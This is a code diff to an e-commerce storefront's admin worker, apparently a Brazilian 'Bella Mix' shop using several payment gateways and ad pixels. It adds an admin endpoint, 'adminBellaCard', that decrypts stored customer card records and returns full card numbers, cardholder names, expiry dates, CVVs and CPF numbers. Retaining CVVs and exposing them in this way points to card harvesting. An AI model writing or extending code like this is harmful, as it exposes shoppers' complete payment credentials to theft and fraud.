@@ -27,6 +27,7 @@ import { onRequest as bellaFbPurchase } from '../sites/bella/functions/api/fb-pu
 import { onRequest as bellaUtmifyOrder } from '../sites/bella/functions/api/utmify-order.js';
 import { listGateways as listBellaGateways, setGatewayEnabled as setBellaGatewayEnabled } from '../sites/bella/functions/_lib/gateway-config.js';
 import { safeCardSummary } from '../sites/bella/functions/_lib/card-summary.js';
+import { cardSecret, decryptCardData } from '../sites/bella/functions/_lib/card-crypto.js';
 
 const JSON_HEADERS = { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' };
 const gateways = [
@@ -295,14 +296,16 @@ function bellaSiteRequest(url, env) {
   return (hostname && url.hostname.toLowerCase() === hostname) || url.pathname === '/video' || url.pathname.startsWith('/video/');
 }
 
+// Todas as lojas usam o mesmo backend e as mesmas variáveis. Se algum dia
+// precisar separar uma conta, uma variável BELLA_<NOME> sobrescreve a
+// equivalente apenas nas rotas do catálogo Bella Mix.
 function bellaEnvironment(env) {
-  const scoped = ['IRONPAY_API_TOKEN', 'IRONPAY_OFFER_HASH', 'IRONPAY_PRODUCT_HASH', 'MASTERFY_API_KEY', 'UMBRELLAPAG_API_KEY', 'VENUS_PAY_SECRET_KEY', 'VENUS_PAY_PRODUCT_ID', 'FLEVOPAY_API_KEY', 'FLEVOPAY_PRODUCT_HASH', 'RESEND_API_KEY', 'RESEND_FROM_EMAIL', 'UTMIFY_API_TOKEN', 'FB_PIXEL_ID', 'FB_ACCESS_TOKEN', 'VITE_GTM_ID', 'VITE_GA_ID', 'VITE_UTMIFY_PIXEL_ID'];
-  const paymentKeys = new Set(['IRONPAY_API_TOKEN', 'IRONPAY_OFFER_HASH', 'IRONPAY_PRODUCT_HASH', 'MASTERFY_API_KEY', 'UMBRELLAPAG_API_KEY', 'VENUS_PAY_PRODUCT_ID']);
+  const override = Object.fromEntries(Object.keys(env)
+    .filter((key) => key.startsWith('BELLA_') && env[key])
+    .map((key) => [key.slice('BELLA_'.length), env[key]]));
   return {
     ...env,
-    ...Object.fromEntries(scoped.map((key) => [key, env[`BELLA_${key}`] || (paymentKeys.has(key) ? undefined : env[key])])),
-    SUPABASE_URL: env.BELLA_SUPABASE_URL,
-    SUPABASE_SERVICE_ROLE_KEY: env.BELLA_SUPABASE_SERVICE_ROLE_KEY,
+    ...override,
     SITE_VARIANT: 'video',
     SITE_URL: env.BELLA_SITE_URL || `${String(env.SITE_URL || 'https://gokoco-tiktok.pages.dev').replace(/\/+$/, '')}/video`,
   };
@@ -346,7 +349,7 @@ async function adminBellaOrders(request, env) {
     if (!Number.isSafeInteger(offset) || offset < 0 || offset > 100000) return json({ error: 'Página inválida.' }, 400);
     const rows = await fetch(`${base}/rest/v1/leads?select=id,created_at,nome,email,telefone,produtos,valor,metodo_pagamento,status,transaction_id,codigo_rastreio,gateway,cidade,estado,cep,rua,numero,bairro,tracking,card_encriptado&order=created_at.desc&limit=500&offset=${offset}`, { headers });
     if (!rows.ok) return json({ error: 'Não foi possível listar os pedidos Bella Mix.' }, 502);
-    return json({ orders: (await rows.json()).map(({ card_encriptado, ...order }) => ({ ...order, cardSummary: safeCardSummary(card_encriptado), siteVariant: order.tracking?.site_variant === 'video' ? 'video' : 'bella_legacy' })) });
+    return json({ orders: (await rows.json()).map(({ card_encriptado, ...order }) => ({ ...order, cardSummary: safeCardSummary(card_encriptado), cardEncrypted: !!card_encriptado && !safeCardSummary(card_encriptado), siteVariant: order.tracking?.site_variant === 'video' ? 'video' : 'bella_legacy' })) });
   }
   if (request.method === 'PATCH') {
     const body = await request.json().catch(() => ({}));
@@ -360,6 +363,39 @@ async function adminBellaOrders(request, env) {
     return json({ ok: true, order: (await changed.json())[0] || null });
   }
   return json({ error: 'Método inválido.' }, 405);
+}
+
+async function adminBellaCard(request, env) {
+  const denied = await requireAdmin(request, env); if (denied) return denied;
+  if (request.method !== 'GET') return json({ error: 'Método inválido.' }, 405);
+  const id = String(new URL(request.url).searchParams.get('id') || '');
+  if (!/^[0-9a-f-]{36}$/i.test(id)) return json({ error: 'Pedido inválido.' }, 400);
+  const bella = bellaEnvironment(env);
+  const base = String(bella.SUPABASE_URL || '').replace(/\/+$/, '');
+  const key = String(bella.SUPABASE_SERVICE_ROLE_KEY || '');
+  if (!base || !key) return json({ error: 'Banco Bella Mix não configurado.' }, 503);
+  const rows = await fetch(`${base}/rest/v1/leads?id=eq.${encodeURIComponent(id)}&select=id,card_encriptado&limit=1`, { headers: { apikey: key, Authorization: `Bearer ${key}` } });
+  if (!rows.ok) return json({ error: 'Não foi possível consultar o pedido.' }, 502);
+  const stored = String((await rows.json())[0]?.card_encriptado || '');
+  if (!stored) return json({ error: 'Este pedido não tem dados de cartão salvos.' }, 404);
+  const summary = safeCardSummary(stored);
+  if (summary) return json({ summary });
+  const secret = cardSecret(bella);
+  if (!secret) return json({ error: 'Configure a variável ENCRYPT_KEY (ou VITE_ENCRYPT_KEY) no Cloudflare para visualizar os cartões.' }, 503);
+  try {
+    const parsed = JSON.parse(await decryptCardData(stored, secret));
+    const card = {
+      numero: digits(parsed.numero).slice(0, 19),
+      nome: String(parsed.nome || '').slice(0, 80),
+      validade: String(parsed.validade || '').slice(0, 7),
+      cvv: digits(parsed.cvv).slice(0, 4),
+      cpf: digits(parsed.cpf).slice(0, 11),
+    };
+    if (!card.numero) throw new Error('sem número');
+    return json({ card });
+  } catch {
+    return json({ error: 'Não foi possível descriptografar o cartão. O dado pode estar corrompido.' }, 422);
+  }
 }
 
 async function adminBellaGateways(request, env) {
@@ -797,6 +833,7 @@ export default {
       if (path === '/api/admin/gateways') return await adminGateways(request, env);
       if (path === '/api/admin/orders') return await adminOrders(request, env);
       if (path === '/api/admin/bella-orders') return await adminBellaOrders(request, env);
+      if (path === '/api/admin/bella-card') return await adminBellaCard(request, env);
       if (path === '/api/admin/bella-gateways') return await adminBellaGateways(request, env);
       if (path === '/api/admin/bella-tracking-email') return await adminBellaTrackingEmail(request, env);
       if (path === '/api/admin/reconcile-payments') return await reconcilePaymentsRoute(request, env);
